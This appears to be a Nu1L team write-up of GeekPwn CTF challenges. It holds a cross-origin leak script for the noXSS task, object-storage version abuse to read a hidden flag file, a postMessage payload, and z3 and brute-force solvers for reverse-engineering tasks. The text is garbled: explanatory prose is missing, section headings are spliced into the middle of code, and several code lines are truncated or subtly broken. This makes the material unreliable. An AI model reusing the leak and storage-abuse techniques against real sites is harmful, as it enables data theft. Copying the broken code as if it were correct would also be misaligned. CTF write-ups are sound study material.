GeekPwn CTF WP
AuthorNu1L Team
GeekPwn CTF WP
WEB
noXSS 2020
rtmpdump
cosplay!
umsg
Re
easyydre
Androidcmd
babyre
Pwn
BabyPwn
PlayTheNew
EasyShell
ChildShell
WEB
noXSS 2020
....
Cross Origin Opener Policy
      function cb(win,c) {
        if(win.frames.length == 0) {
            location.href = (');
          }
          win.close()
      }
      function test(c) {
        url = "{e6bd066f-d918-
496c-b3d2-ccd972d7a5a2"+c;
        console.log(url);
        win = window.open(url);
rtmpdump
0daycrontab
cosplay!
        setTimeout(cb.bind(null,win,c), 5000);
      }
      var charset = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 
'b', 'c', 'd', 'e', 'f', 'A', 'B', 'C', 'D', 'E', 'F', '-', '}']
      for(var i=0; i
var Bucket = '933kpwn-1253882285';
var Region = 'ap-shanghai';
var cos = new COS({
    getAuthorization: function (options, callback) {
        var url = '/GetTempKey?path=/upload';
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.onload = function (e) {
            try {
                var data = JSON.parse(e.target.responseText);
                var credentials = data.Credentials;
            } catch (e) {
            }
            if (!data || !credentials) return console.error('credentials 
invalid');
            callback({
                TmpSecretId: credentials.TmpSecretId,
                TmpSecretKey: credentials.TmpSecretKey,
                XCosSecurityToken: credentials.Token,
                ExpiredTime: data.ExpiredTime,
            });
        };
 listObjectVersions   Bucket  f1L9@/flag.txt  
 VersionId   getObject  
umsg
js
        xhr.send();
    }
});
document.getElementById('file-selector').onchange = function () {
    var file = this.files[0];
    if (!file) return;
    cos.putObject({
        Bucket: Bucket,
        Region: Region,
        Key: '/upload/' + file.name,
        Body: file,
    }, function (err, data) {
        console.log(err, data);
    });
};
cos.listObjectVersions({Bucket: Bucket, Region: Region}, function (err, data) 
{
    console.log(err || data);
});
cos.getObject({Bucket: Bucket, Region: Region, Key: 'f1L9@/flag.txt', 
VersionId: 'MTg0NDUxNDk2MzgxNjA2ODMyNTU'}, function (err, data) {
    console.log(err || data);
});
originmatch, iframe, iframe, html, 
http://umsg.iﬃ.top.xxx.xxxmatch
Re
easyydre
Encryption1(looks like a stream cipher):
key = [0xd4,0xd4,0x27,0x8c,0xbd,0x42,0x4d,0x64,0x60,0x44,0xac,0x6d,0x9b,0x64,0x9b,0xd3]
dst = [0xf3, 0xb8, 0xc6, 0x6b, 0x11, 0x47, 0x3e, 0xa2, 0xe5, 0xd3, 0x43, 0x1d, 0x24, 0x42, 0xab,
0x4b, 0x15, 0x19, 0x2d, 0xcf, 0x1, 0xef, 0x7a, 0x40, 0x5b, 0x86, 0xd0, 0x88, 0xe0, 0x7, 0x8f, 0x57]
[:16]
Key  dump  boxes / subkeys
 ﬂag part1(16bytes): aac1b72f-6846-40 
Encryption2:
 mpz  7  dword 20 bytes
 20 bytes  7  dword 
 patch  16 bytes  pad  36
bytes dump  7  dword  mangshengfaxianhuadian  dump 
  function test() {
    window.frames[0].postMessage({action: 'append', payload: ''}, 
"http://umsg.iffi.top:3000/")
  };
setTimeout("test()",1000);
from z3 import *
def ror(d, n):
    return ((d >> n) | (d > (32-n))) % 0x100000000
def bytearray2intarray(arr):
    assert len(arr) % 4 == 0
    result = []
    for i in range(len(arr)//4):
        tmp = arr[4*i] + arr[4*i+1]*0x100 + \\
            arr[4*i+2]*0x10000 + arr[4*i+3]*0x1000000
        result.append(tmp)
    return result
def int2bytearray(num):
    result = []
    for i in range(4):
        result.append((num >> (i * 8)) & 0xff)
    return result
def z3_solve(m_new, v16, v14, v15):
    s = Solver()
    m0 = BitVec('m0', 32)
    cal = m0 ^ ror(v16 | v14 | v15, 14) ^ rol(v16 | v14 | v15, 10) ^ rol(
        v16 | v14 | v15, 2) ^ (v16 | v14 | v15) ^ ror(v16 | v14 | v15, 8)
    # print(cal)
    s.add(cal == m_new)
    assert s.check() == sat
    return s.model()[m0].as_long()
def main():
    with open('./processed_key', 'rb') as f:
        processed_key = bytearray2intarray(f.read()[:32*4])
    with open('./dumped_boxes', 'rb') as f:
        dumped_boxes = f.read()
        box4 = bytearray2intarray(dumped_boxes[0:256*4])
        box3 = bytearray2intarray(dumped_boxes[256*4:(256*2)*4])
        box2 = bytearray2intarray(dumped_boxes[(256*2)*4:(256*3)*4])
        box1 = bytearray2intarray(dumped_boxes[(256*3)*4:(256*4)*4])
    dst = [0xf3, 0xb8, 0xc6, 0x6b, 0x11, 0x47, 0x3e, 0xa2, 0xe5, 0xd3, 0x43, 
0x1d, 0x24, 0x42, 0xab,
           0x4b, 0x15, 0x19, 0x2d, 0xcf, 0x1, 0xef, 0x7a, 0x40, 0x5b, 0x86, 
0xd0, 0x88, 0xe0, 0x7, 0x8f, 0x57, 0x72, 0xa2, 0x09, 0x48]
    dst1, dst2 = dst[:16], dst[16:]
    dst1 = [0]*32 + bytearray2intarray(dst1)[::-1]
    for _r in range(32):
        r = 31 - _r
        # m0 = dst[r]
        m1 = dst1[r+1]
        m2 = dst1[r+2]
Androidcmd
        m3 = dst1[r+3]
        special_key = processed_key[r]
        keyed_msg = m1 ^ m2 ^ special_key ^ m3
        keyed_msg = int2bytearray(keyed_msg)
        v13 = box1[keyed_msg[3]] ^ box2[keyed_msg[3]] \\
            ^ box3[keyed_msg[3]] ^ box4[keyed_msg[3]]
        v14 = box1[keyed_msg[2]] ^ box2[keyed_msg[2]] \\
            ^ box3[keyed_msg[2]] ^ box4[keyed_msg[2]]
        v14 <<= 16
        v15 = box1[keyed_msg[1]] ^ box2[keyed_msg[1]] \\
            ^ box3[keyed_msg[1]] ^ box4[keyed_msg[1]]
        v15 <<= 8
        v16 = box1[keyed_msg[0]] ^ box2[keyed_msg[0]] \\
            ^ box3[keyed_msg[0]] ^ box4[keyed_msg[0]] | (v13 << 24)
        m_new = dst1[r+4]
        m0 = z3_solve(m_new, v16, v14, v15)
        dst1[r] = m0
    flag = []
    for i in range(4):
        flag += int2bytearray(dst1[i])
    mangshengfaxianhuadian = [0x9eb5b821, 0x33b59204,
                              0x9eb5b821, 0xf3f66345,
                              0xe9b6e769, 0x65eb3ed7, 0x2b3bc746]
    result = bytearray2intarray(dst2)
    result[0] ^= mangshengfaxianhuadian[0]
    result[0] ^= mangshengfaxianhuadian[1]
    result[1] ^= mangshengfaxianhuadian[2]
    result[1] ^= mangshengfaxianhuadian[3]
    result[2] ^= mangshengfaxianhuadian[4]
    result[3] ^= mangshengfaxianhuadian[5]
    result[4] ^= mangshengfaxianhuadian[6]
    for each in result:
        flag += int2bytearray(each)
    print('flag{' + bytearray(flag).decode() + '}')
if __name__ == '__main__':
    main()
import hashlib
tbl = '0123456789abcdef'
def get_md5_value(s):
    md5 = hashlib.md5()
    md5.update(s.encode('ascii'))
    md5_digest = md5.hexdigest()
    return md5_digest
def brut():
    a1 = ['_'] * 37
    a1[22] = 'a'
    a1[23] = '-'
    a1[16] = '2'
    a1[20] = 'e'
    a1[13] = '-'